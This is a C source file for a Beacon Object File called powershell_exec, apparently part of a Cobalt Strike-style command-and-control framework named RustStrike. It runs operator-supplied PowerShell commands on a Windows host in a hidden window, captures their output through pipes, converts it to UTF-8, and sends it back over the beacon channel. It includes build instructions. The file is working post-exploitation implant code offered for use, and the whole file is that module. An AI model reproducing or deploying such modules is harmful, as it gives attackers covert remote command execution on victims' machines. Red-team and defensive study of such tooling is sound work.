/*
 * powershell_exec BOF for RustStrike — run a PowerShell command and return output.
 *
 *   args: the command line as RAW text (no length prefix), e.g.
 *   "Get-Process | Select-Object -First 3", "Get-Location". The Terminal sends
 *   exactly Array.from(new TextEncoder().encode(cmd)) — same convention as
 *   cmd_exec.c. Type the script directly in the PowerShell terminal.
 *
 * Launches `powershell.exe -NoProfile -NonInteractive -Command <cmd>` with a
 * redirected pipe (no window), drains stdout+stderr, converts the console
 * codepage (OEM/ACP, e.g. GBK/CP936) to UTF-8, and prints it back via
 * BeaconOutput. Same pipe+conversion machinery as cmd_exec.c.
 *
 * Build (mingw):
 *   gcc -c examples/powershell_exec.c -o examples/powershell_exec.x64.o
 */
#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR,
    LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, WINBOOL, DWORD, LPVOID,
    LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$CreatePipe(PHANDLE, PHANDLE,
    LPSECURITY_ATTRIBUTES, DWORD);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$SetHandleInformation(HANDLE, DWORD, DWORD);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD,
    LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$GetExitCodeProcess(HANDLE, LPDWORD);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT int WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCSTR, int, LPWSTR, int);
DECLSPEC_IMPORT int WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);
DECLSPEC_IMPORT int __cdecl MSVCRT$_snprintf(char *, size_t, const char *, ...);

#define BUF_SIZE 65536

void go(char *args, int alen) {
    char cmd[1024];
    int clen = alen < (int)sizeof(cmd) - 1 ? alen : (int)sizeof(cmd) - 1;
    if (clen <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "powershell_exec: no command specified");
        return;
    }
    for (int i = 0; i < clen; i++) cmd[i] = args[i];
    cmd[clen] = 0;
    while (clen > 0 && (cmd[clen - 1] == '\n' || cmd[clen - 1] == '\r')) {
        cmd[--clen] = 0;
    }
    if (clen == 0) {
        BeaconPrintf(CALLBACK_ERROR, "powershell_exec: no command specified");
        return;
    }

    char cmdline[1280];
    MSVCRT$_snprintf(cmdline, sizeof(cmdline), "powershell.exe -NoProfile -NonInteractive -Command %s", cmd);
    cmdline[sizeof(cmdline) - 1] = 0;

    HANDLE heap = KERNEL32$GetProcessHeap();
    char *buf = (char *) KERNEL32$HeapAlloc(heap, 0, BUF_SIZE);
    if (!buf) { BeaconPrintf(CALLBACK_ERROR, "powershell_exec: out of memory"); return; }
    for (int i = 0; i < BUF_SIZE; i++) buf[i] = 0;

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    HANDLE hRead = NULL, hWrite = NULL;
    if (!KERNEL32$CreatePipe(&hRead, &hWrite, &sa, 0)) {
        BeaconPrintf(CALLBACK_ERROR, "powershell_exec: CreatePipe failed (%lu)",
                     KERNEL32$GetLastError());
        KERNEL32$HeapFree(heap, 0, buf);
        return;
    }
    KERNEL32$SetHandleInformation(hRead, 0x00000001 /*HANDLE_FLAG_INHERIT*/, 0);

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = 0x00000100 /*STARTF_USESTDHANDLES*/;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.hStdInput = NULL;
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    if (!KERNEL32$CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
            0x08000000 /*CREATE_NO_WINDOW*/, NULL, NULL, &si, &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "powershell_exec: CreateProcessA failed (%lu)",
                     KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hRead);
        KERNEL32$CloseHandle(hWrite);
        KERNEL32$HeapFree(heap, 0, buf);
        return;
    }
    KERNEL32$CloseHandle(hWrite);

    DWORD total = 0, got = 0;
    while (KERNEL32$ReadFile(hRead, buf + total, BUF_SIZE - 1 - total, &got, NULL) && got > 0) {
        total += got;
        if (total >= BUF_SIZE - 1) break;
    }
    buf[total] = 0;

    KERNEL32$WaitForSingleObject(pi.hProcess, 0xFFFFFFFF /*INFINITE*/);
    DWORD exitcode = 0;
    KERNEL32$GetExitCodeProcess(pi.hProcess, &exitcode);

    if (total > 0) {
        /* PowerShell redirected output is in the console's OEM/ANSI codepage
         * (GBK/CP936 on Chinese Windows). Convert CP_ACP → UTF-16 → UTF-8 so
         * the loader's from_utf8_lossy doesn't mangle it. Fall back to raw
         * bytes if the conversion fails (ASCII-only output is a no-op anyway). */
        int wlen = KERNEL32$MultiByteToWideChar(0 /*CP_ACP*/, 0, buf, (int)total, NULL, 0);
        if (wlen > 0) {
            wchar_t *wbuf = (wchar_t *) KERNEL32$HeapAlloc(heap, 0, (wlen + 1) * 2);
            if (wbuf) {
                KERNEL32$MultiByteToWideChar(0, 0, buf, (int)total, wbuf, wlen);
                int ulen = KERNEL32$WideCharToMultiByte(65001 /*CP_UTF8*/, 0,
                    wbuf, wlen, NULL, 0, NULL, NULL);
                if (ulen > 0) {
                    char *utf8 = (char *) KERNEL32$HeapAlloc(heap, 0, ulen + 1);
                    if (utf8) {
                        KERNEL32$WideCharToMultiByte(65001, 0, wbuf, wlen, utf8, ulen, NULL, NULL);
                        utf8[ulen] = 0;
                        BeaconOutput(CALLBACK_OUTPUT, utf8, ulen);
                        KERNEL32$HeapFree(heap, 0, utf8);
                        KERNEL32$HeapFree(heap, 0, wbuf);
                        KERNEL32$CloseHandle(hRead);
                        KERNEL32$CloseHandle(pi.hProcess);
                        KERNEL32$CloseHandle(pi.hThread);
                        KERNEL32$HeapFree(heap, 0, buf);
                        return;
                    }
                }
                KERNEL32$HeapFree(heap, 0, wbuf);
            }
        }
        BeaconOutput(CALLBACK_OUTPUT, buf, (int)total);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "(no output, exit code %lu)", exitcode);
    }

    KERNEL32$CloseHandle(hRead);
    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);
    KERNEL32$HeapFree(heap, 0, buf);
}
